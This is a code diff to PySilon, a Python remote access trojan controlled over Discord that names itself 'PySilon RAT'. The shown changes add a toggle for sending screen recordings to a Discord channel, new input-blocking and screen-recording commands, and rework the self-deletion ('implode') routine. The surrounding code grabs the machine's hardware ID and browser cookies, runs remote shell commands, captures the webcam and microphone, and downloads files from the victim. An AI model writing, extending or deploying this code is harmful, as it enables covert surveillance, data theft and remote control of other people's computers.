@@ -28,6 +28,7 @@ import discord
 import asyncio
 import sys
 import os
+import time
 auto = 'auto'
 
 #
@@ -73,14 +74,15 @@ messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
-
+send_recordings = True
+latest_messages_in_recordings = []
 # [pysilon_var] !registry 0
 
 working_directory = ['C:', 'Users', getuser(), software_directory_name]
 
 @client.event
 async def on_ready():
-    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread
+    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
     hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
 
     first_run = True
@@ -141,11 +143,21 @@ async def on_ready():
             elif channel.name == 'recordings': channel_ids['recordings'] = channel.id
             elif channel.name == 'Live microphone': channel_ids['voice'] = channel.id
 
-    await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```')
+    await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```\n_ _\n_ _\n_ _')
 
 # [pysilon_var] !recording_startup 1
     
     while True:
+        global send_recordings
+        recordings_obj = client.get_channel(channel_ids['recordings'])
+        async for latest_message in recordings_obj.history(limit=2):
+            latest_messages_in_recordings.append(latest_message.content)
+        if 'disable' in latest_messages_in_recordings:
+            send_recordings = False
+        else:
+            send_recordings = True
+
+        latest_messages_in_recordings = []
         if len(messages_to_send) > 0:
             for message in messages_to_send:
                 await client.get_channel(message[0]).send(message[1])
@@ -190,7 +202,7 @@ async def on_reaction_add(reaction, user):
                 if str(reaction) == '💀' and expectation == 'implosion':
                     await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
 # [pysilon_var] !registry_implosion 5
-                    secure_delete_file('PySilon.key', 10)
+                    secure_delete_file(filename, 10)
                     try: rmtree('rec_')
                     except: pass
                     with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
@@ -200,7 +212,7 @@ async def on_reaction_add(reaction, user):
                 elif str(reaction) == '🔴' and expectation == 'implosion':
                     expectation = None
 # [pysilon_var] on reaction add 4
-            except Exception as err: await reaction.message.channel.send(str(err))
+            except Exception as err: await reaction.message.channel.send(f'```{str(err)}```')
 
 @client.event
 async def on_raw_reaction_remove(payload):
@@ -213,7 +225,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, filename
     if message.author != client.user:
         if message.channel.id in channel_ids.values():
             if message.content == '.implode':
@@ -230,12 +242,13 @@ async def on_message(message):
             elif message.content[:5] == '.help':
                 await message.delete()
                 if message.content.strip() == '.help':
-                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.cmd [command]\n.cd [dir]\n.update\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
+                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.screenrec\n.block-input\n.unblock-input\n.cmd [command]\n.cd [dir]\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
             
             elif expectation == 'key':
                 try:
                     split_v1 = str(message.attachments).split("filename='")[1]
                     filename = str(split_v1).split("' ")[0]
+                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                     await message.attachments[0].save(fp=filename)
                     if get_file_hash(filename) == secret_key:
                         reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
@@ -245,8 +258,8 @@ async def on_message(message):
                     else:
                         reaction_msg = await message.channel.send('```❗ Provided key is invalid```'); await reaction_msg.add_reaction('🔴')
                         expectation = None
-                except:
-                    await message.channel.send('```❗ Something went wrong while fetching secret key...```')
+                except Exception as err: 
+                    await message.channel.send(f'```❗ Something went wrong while fetching secret key...\n{str(err)}```')
                     expectation = None
 
 # [pysilon_var] on message 3
